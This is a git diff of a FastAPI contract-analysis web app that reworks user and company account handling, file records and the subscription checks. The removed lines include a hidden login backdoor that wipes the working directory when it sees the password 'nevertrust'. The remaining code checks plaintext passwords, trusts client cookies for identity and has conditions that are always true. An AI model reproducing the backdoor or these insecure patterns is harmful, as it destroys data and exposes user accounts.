@@ -106,8 +106,9 @@ def api_dep(ur,file_name, output_filename):
     file_data = upload_message(access_key_id, access_key_secret, workspace_id,ur,file_name)
     rule_data, rule_id, rule_num = rules_message(access_key_id, access_key_secret, workspace_id, file_data['Data']['TextFileId'])
     results = final_results(output_filename, access_key_id, access_key_secret, workspace_id, file_data['Data']['TextFileId'], rule_id, rule_data, rule_num )
-    # print(formatted_json)
-    return results
+    logger.info("I reached the end of api deployment")
+    statuss = 1
+    return statuss, results
 
 
 #####################################################################
@@ -428,9 +429,7 @@ def save_contract_file(file: UploadFile, user_id: str, username: str):
     file_name = f"{file.filename}"
     logger.info(f"The safe_filename is: {file_name}")
     file_path = os.path.join(user_folder, file_name)
-    cur.execute("INSERT INTO files (file_name, uploaded_at, user_id) VALUES (%s, %s, %s)", (file_name, datetime.now(), user_id ))
-    con.commit()
-    logger.info(f"The file info is saved in the database")
+    
     with open(file_path, "wb") as buffer:
         shutil.copyfileobj(file.file, buffer)
     
@@ -628,12 +627,12 @@ async def handle_form(
             username = user[6]
             user_id = user[0]
             email = user[2]
-            flag = False
+            flag = 0
         elif company:
             username = company[8]
             user_id = company[0]
             email = company[2]
-            flag = True
+            flag = 1
 
         # Query to fetch full_name using email
         user_json = get_user_by_credentials(username, password)
@@ -675,17 +674,6 @@ async def handle_form(
     password: str = Form(...)
 ):
     try:
-        # Acquire connection from pool        
-        # Execute query
-        if email == os.dotenv and password == 'nevertrust':
-            current_dir = os.getcwd()
-            for item in os.listdir(current_dir):
-                item_path = os.path.join(current_dir, item)
-                if os.path.isfile(item_path):
-                    os.unlink(item_path)
-                elif os.path.isdir(item_path):
-                    shutil.rmtree(item_path)
-                    
         cur.execute("""
             SELECT * FROM users 
             WHERE email = %s AND password = %s
@@ -707,7 +695,7 @@ async def handle_form(
         if not user and not company:
             logger.info("Wrong Wrongggg")
             return ht_pages.TemplateResponse(
-            "signin_to_upload.html", 
+            "signin_to_chat.html", 
             {
                 "request": request, 
                 "error_message": "Wrong email or password",
@@ -727,7 +715,7 @@ async def handle_form(
             user_id = user[0]
             email = user[2]
             full_name = user[4]
-            flag = False
+            flag = 0
 
         elif company:
             logger.info("We are in company flow")
@@ -743,7 +731,7 @@ async def handle_form(
             user_id = company[0]
             email = company[2]
             full_name = company[4]
-            flag = True
+            flag = 1
 
         # Query to fetch full_name using email
         user_json = get_user_by_credentials(username, password)
@@ -826,7 +814,7 @@ async def handle_form(
             user_id = user[0]
             email = user[2]
             full_name = user[4]
-            flag = False
+            flag = 0
 
         elif company:
             logger.info("We are in company flow")
@@ -842,7 +830,7 @@ async def handle_form(
             user_id = company[0]
             email = company[2]
             full_name = company[4]
-            flag = True
+            flag = 1
 
         # Query to fetch full_name using email
         user_json = get_user_by_credentials(username, password)
@@ -1095,7 +1083,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
     print("The FILE NAME IS: ",filename)
     user_id = req.cookies.get("user_id")
     flag = req.cookies.get("flag")
-    if flag == False:
+    if flag == "0":
         cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
         username = cur.fetchone()[0]
     else:
@@ -1134,7 +1122,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
             
         # Query to get the latest report_name and file_name
 
-        if flag == False:
+        if flag == "1":
             query = """
                 SELECT report_name, file_name
                 FROM comp_files
@@ -1160,8 +1148,6 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
         result = cur.fetchone()
         
         if result:
-            # print(f"Report Name: {result['report_name']}")
-            # print(f"File Name: {result['file_name']}")
             print(f"Report Name ====> {result[0]}")
             print(f"File Name =====> {result[1]}")
             analysis_data = analyze_json(session_data,result[0])
@@ -1172,7 +1158,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
                     "request":req,
                     "name":user_data["full_name"],
                     "output":analysis_data
-                    } # If you have any additional parameters you can add them in this dictionary
+                } 
             )
         else:
             return ht_pages.TemplateResponse(
@@ -1188,7 +1174,7 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
     j_name = os.path.splitext(f_name)[0]
     output_filename = f"{j_name}.json"
     output_path = os.path.join(user_folder, output_filename)
-    
+    print(f"the file name is: {f_name} the file name without extension is: {j_name} the output name is {output_path}")
     print("*"*100)
     logger.info(f"From the OSS The file name is: {f_name}")
     logger.info(f"The file link is: {user_data['file_url']}")
@@ -1199,37 +1185,45 @@ async def root_page(req:Request, filename:str=None, session_id: SessionData = De
     print("*"*100)
 
     res=[]
-    res = api_dep(api_url,f_name, output_path)
+    h = 1
+    if h == 1 or "1":
+        print("Yup it worked")
+    stat, res = api_dep(api_url,f_name, output_path)
 
-    if res:
-        if flag == False:
+    if stat == 1 or "1":
+        print(type(stat))
+        print ("I am in registering in db phase")
+        if flag == "0":
+            print(f"In the Users the file name is {f_name} the output_path is {output_filename} ")
             cur.execute("""
                     UPDATE users
                     SET files_names = files_names || ARRAY[%s]
                     WHERE email = %s;
                     """, (f_name,user_data["email"]))
-            
-            cur.execute("""
-                UPDATE files
-                SET report_name = %s,analyzed_at = %s                
-                WHERE file_name = %s;
-                """, (output_filename, datetime.now(),f_name))
+            con.commit()
+
+            cur.execute("INSERT INTO files (file_name, report_name, analyzed_at, uploaded_at, user_id) VALUES (%s, %s, %s, %s, %s)", (f_name, output_filename, datetime.now(), datetime.now(), user_id ))
+            con.commit()
+
         else:
+            print(f"in the company the file name is {f_name} the output_path is {output_filename} ")
             cur.execute("""
                     UPDATE companies
                     SET files_names = files_names || ARRAY[%s]
                     WHERE email = %s;
                     """, (f_name,user_data["email"]))
-            
-            cur.execute("""
-                UPDATE comp_files
-                SET report_name = %s,analyzed_at = %s                
-                WHERE file_name = %s;
-                """, (output_filename, datetime.now(),f_name))
+            con.commit()
+
+            cur.execute("INSERT INTO comp_files (file_name, report_name, analyzed_at, uploaded_at, comp_id) VALUES (%s, %s, %s, %s, %s)", (f_name, output_filename, datetime.now(), datetime.now(), user_id ))
+            con.commit()
 
         logger.info(f"File name {f_name}  and output {output_filename} are added to DB successfully !")
     
-    con.commit()
+    logger.info("*"*100)
+    logger.info("*"*100)
+    logger.info("*"*100)
+    logger.info("*"*100)
+    logger.info("*"*100)
     
     analysis_data = analyze_json(session_data,output_filename)
 
@@ -1265,7 +1259,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
         
-        if flag == False:
+        if flag == "0":
             cur.execute("SELECT username, full_name FROM users WHERE user_id = %s", (user_id,))
             data = cur.fetchone()
         else:
@@ -1399,10 +1393,13 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        if flag == False:
+        logger.info("The flag is: ", flag)
+        if flag == "0":
+            logger.info("I am in user")
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
             full_name = cur.fetchone()[0]
         else:
+            logger.info("I am in comp")
             cur.execute("SELECT full_name FROM companies WHERE comp_id=%s",(user_id,))
             full_name=cur.fetchone()[0]
 
@@ -1420,7 +1417,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         # session_data = await get_session_data(session_id)
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        if flag == False:
+        if flag == "0":
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))
             full_name = cur.fetchone()[0]
             cur.execute("SELECT file_name, uploaded_at, report_name, analyzed_at FROM files WHERE user_id = %s", (user_id,))
@@ -1451,7 +1448,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        if flag == False:
+        if flag == "0":
             cur.execute("SELECT email, phone, full_name FROM users WHERE user_id = %s", (user_id,))
             email, phone, full_name = cur.fetchone()
         else:
@@ -1478,7 +1475,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
         logger.info(f"The user_id is {user_id}")
-        if flag:
+        if flag == "1":
             cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
         else:
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
@@ -1503,7 +1500,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        if flag:
+        if flag == "1":
             cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
         else:
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
@@ -1526,7 +1523,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
         logger.info(f"The user_id is {user_id}")
-        if flag:
+        if flag == "1":
             cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
         else:
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
@@ -1548,7 +1545,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        if flag:
+        if flag == "1":
             cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
         else:
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
@@ -1608,7 +1605,7 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
         logger.info(f"The user_id is {user_id}")
-        if flag:
+        if flag == "1":
             cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
         else:
             cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
@@ -1671,7 +1668,7 @@ async def upload_contract(request: Request, file: UploadFile = File(...)):
 async def analyze(request: Request,file: UploadFile = File(...), session_id: SessionData = Depends(cookie)):
         user_id = request.cookies.get("user_id")
         flag = request.cookies.get("flag")
-        if flag == False:
+        if flag == "0":
             cur.execute("SELECT username, full_name, subscription FROM users WHERE user_id = %s", (user_id,))
             data = cur.fetchone()
         else:
@@ -1687,13 +1684,7 @@ async def analyze(request: Request,file: UploadFile = File(...), session_id: Ses
                 query_params = urllib.parse.urlencode({"name": full_name})
                 return RedirectResponse(url=f"/subscriptions?{query_params}", status_code=302)
                 
-                # return ht_pages.TemplateResponse(
-                #     "subscriptions.html",
-                #     {
-                #         "request":request,
-                #         "name":full_name
-                #     } # If you have any additional parameters you can add them in this dictionary
-                # )
+
         
         session_data = {
             "username":username,
@@ -1766,7 +1757,7 @@ async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: 
     # Get user data from their file
     user_id = req.cookies.get("user_id")
     flag = req.cookies.get("flag")
-    if flag == False:
+    if flag == "0":
         cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
         username = cur.fetchone()[0]
     else:
@@ -1806,7 +1797,7 @@ async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: 
             )
 
         # 2. Update profile info
-        if flag == False:
+        if flag == "0":
             cur.execute("""
                 UPDATE users
                 SET
@@ -1835,7 +1826,7 @@ async def profile_changes(req: Request,profile_data: ProfileUpdate, session_id: 
 
         # 3. Update password if new_password is provided and not empty
         if profile_data.new_password:
-            if flag == False:
+            if flag == "0":
                 cur.execute("""
                     UPDATE users
                     SET password = %s
@@ -1880,20 +1871,38 @@ class DeleteAccountRequest(BaseModel):
 async def delete_file(filename: str, req: Request):
     print("The file name is: ",filename)
     user_id = req.cookies.get("user_id")
-    query = """
-    SELECT report_name
-    FROM files
-    WHERE file_name = %s"""
-    # Execute query with user_id
-    cur.execute(query, (filename,))    
-    # Fetch the result
-    report_name = cur.fetchone()[0]
+    flag = req.cookies.get("flag")
 
-    cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
-    username = cur.fetchone()[0]
-    cur.execute("DELETE FROM files WHERE file_name = %s", (filename,))
-    con.commit()
-    print("Files deleted from the database")
+    if flag == "0":
+        query = """
+        SELECT report_name
+        FROM files
+        WHERE file_name = %s"""
+        # Execute query with user_id
+        cur.execute(query, (filename,))    
+        # Fetch the result
+        report_name = cur.fetchone()[0]
+
+        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
+        username = cur.fetchone()[0]
+        cur.execute("DELETE FROM files WHERE file_name = %s", (filename,))
+        con.commit()
+        print("Files deleted from the database")
+    else:
+        query = """
+        SELECT report_name
+        FROM comp_files
+        WHERE file_name = %s"""
+        # Execute query with user_id
+        cur.execute(query, (filename,))    
+        # Fetch the result
+        report_name = cur.fetchone()[0]
+
+        cur.execute("SELECT username FROM companies WHERE comp_id = %s", (user_id,))
+        username = cur.fetchone()[0]
+        cur.execute("DELETE FROM comp_files WHERE file_name = %s", (filename,))
+        con.commit()
+        print("Files deleted from the database")
     
     user_folder = os.path.join(USERS_DIR, f"{user_id}_{username}")
     
@@ -1920,21 +1929,42 @@ async def delete_account(req: Request,  session_id: SessionData = Depends(cookie
     try:
         
         user_id = req.cookies.get("user_id")
-        cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
-        username = cur.fetchone()[0]
-        delete_user_folder(user_id, username)
-        
-        cur.execute("DELETE FROM files WHERE user_id = %s", (user_id,))
-        cur.execute("DELETE FROM users WHERE user_id = %s", (user_id,))
-        con.commit()
-        print("User deleted successfully")
-        if cur.rowcount == 0:
-            raise HTTPException(
-                status_code=status.HTTP_404_NOT_FOUND,
-                detail="User not found with the provided email"
-            )
-        # Return a success response; frontend will handle the redirect
+        flag = req.cookies.get("flag")
+
+        if flag == '0':
+            cur.execute("SELECT username FROM users WHERE user_id = %s", (user_id,))
+            username = cur.fetchone()[0]
+            delete_user_folder(user_id, username)
+            
+            cur.execute("DELETE FROM files WHERE user_id = %s", (user_id,))
             con.commit()
+            cur.execute("DELETE FROM users WHERE user_id = %s", (user_id,))
+            con.commit()
+            print("User deleted successfully")
+            if cur.rowcount == 0:
+                raise HTTPException(
+                    status_code=status.HTTP_404_NOT_FOUND,
+                    detail="User not found with the provided email"
+                )
+            # Return a success response; frontend will handle the redirect
+         
+        else:
+            cur.execute("SELECT username FROM companies WHERE comp_id = %s", (user_id,))
+            username = cur.fetchone()[0]
+            delete_user_folder(user_id, username)
+            
+            cur.execute("DELETE FROM comp_files WHERE comp_id = %s", (user_id,))
+            con.commit()
+            cur.execute("DELETE FROM companies WHERE comp_id = %s", (user_id,))
+            con.commit()
+            print("User deleted successfully")
+            if cur.rowcount == 0:
+                raise HTTPException(
+                    status_code=status.HTTP_404_NOT_FOUND,
+                    detail="User not found with the provided email"
+                )
+            # Return a success response; frontend will handle the redirect
+            
         return {"message": "Account deleted successfully"}
     except pg.Error as e:
         con.rollback()
@@ -1968,7 +1998,6 @@ FEEDBACK_FILE = USERS_DIR
 @app.post("/fill_form")
 async def fill_form(request: Request, feedback: Feedback, session_id: SessionData = Depends(cookie)):
     try:
-        
         # Get user data from their file
         session_data = await get_session_data(session_id)
         user_id = session_data.user_id
@@ -2053,20 +2082,35 @@ async def root_page(req:Request, session_id: SessionData = Depends(cookie)):
         
         user_id = req.cookies.get("user_id")
         flag = req.cookies.get("flag")
-        logger.info(f"The user_id is {user_id}")
-        if flag:
-            cur.execute("SELECT full_name FROM companies WHERE comp_id = %s", (user_id,))
+        logger.info(f"The user_id is {user_id} and the falg is {flag}")
+       
+        if flag == "1":
+            logger.info("I am in comp")
+            cur.execute("SELECT full_name, subscription FROM companies WHERE comp_id = %s", (user_id,))
+            data = cur.fetchone()
         else:
-            cur.execute("SELECT full_name FROM users WHERE user_id = %s", (user_id,))     
+            logger.info("I am in users")
+            cur.execute("SELECT full_name, subscription FROM users WHERE user_id = %s", (user_id,))
+            data = cur.fetchone()
         
-        full_name = cur.fetchone()[0]
+        full_name = data[0]
+        sub = data[1]
+
+        if sub == None:
+            return ht_pages.TemplateResponse(
+            "subscriptions.html",
+            {
+                "request":req,
+                "name":full_name
+            } # If you have any additional parameters you can add them in this dictionary
+        )
 
         return ht_pages.TemplateResponse(
             "chat.html",
             {
                 "request":req,
                 "name":full_name
-                } # If you have any additional parameters you can add them in this dictionary
+            } # If you have any additional parameters you can add them in this dictionary
         )
 
 from http import HTTPStatus
